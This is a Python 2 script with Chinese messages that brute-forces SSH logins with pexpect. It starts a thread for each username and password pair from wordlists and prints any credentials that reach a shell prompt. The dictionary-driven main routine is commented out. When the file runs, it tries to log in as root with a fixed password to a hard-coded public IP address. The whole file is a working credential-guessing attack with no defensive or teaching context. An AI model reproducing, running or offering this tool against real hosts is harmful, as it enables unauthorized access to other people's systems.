# -*- coding: utf-8 -*- 
import optparse,sys,threading
import pexpect
ip = "45.61.213.129"
PROMPT = ['#','>','/$']
def ssh(host,user,password):
    child = pexpect.spawn('ssh %s@%s' % (user,host))
    ret = child.expect(['(?i)are you sure.*','(?i)password:',pexpect.TIMEOUT,pexpect.EOF])
    #print child.before
    if ret == 0:
        child.sendline('yes')
        child.expect('[pP]ssword:')
        child.sendline(password)
        try:
            ret0 = child.expect(PROMPT)
            if ret0 in (0,1,2):
                #print child.before
                print '[+] 已经连接0'
                print '<*>用户是：' + user
                print '<*>密码是：' + password
                #return child
        except:
            print '[-]连接失败0,密码错误！'
    elif ret == 1:
        child.sendline(password)
        try:
            ret1 = child.expect(PROMPT)
            print child.before
            if ret1 in (0,1,2):
                #print child.before
                print '[+] 已经连接1'
                print '<*>用户是：' + user
                print '<*>密码是：' + password
                #return child
        except:
            print '[-]连接失败1，用户或密码错误！'
    else:
        print '[-] 连接失败2'

def main():
    usage = 'Usage:%prog <-H host> <-U user.txt> <-D dictionary.txt>'
    parser = optparse.OptionParser(usage,version='%prog v1.0')
    parser.add_option('-H',dest='target_host',type='string',
                      help='目标主机')
    parser.add_option('-U',dest='user',type='string',
                      help='ssh用户')
    parser.add_option('-D',dest='dictionary',type='string',
                      help='密码字典')
    (options,args) = parser.parse_args()
    if  (not options.target_host) | (not options.user) | (not options.dictionary):
        print parser.usage
        exit(0)
    else:
        target_host = options.target_host
        users = options.user
        passwords = options.dictionary
    users = open(users)
    passwords = open(passwords)
    #i = 0
    for user in users:
        user = user.strip('\r\n')
        #print user + str(i)
        #i = i + 1
        passwords.seek(0)#回到密码文件行首
        for password in passwords:
            password = password.strip('\r\n')
            #print user
            t = threading.Thread(target=ssh,args=(target_host,user,password))
            t.start()

ssh(ip, "root", "666cccpass@word")
# if __name__ == '__main__':
    # main()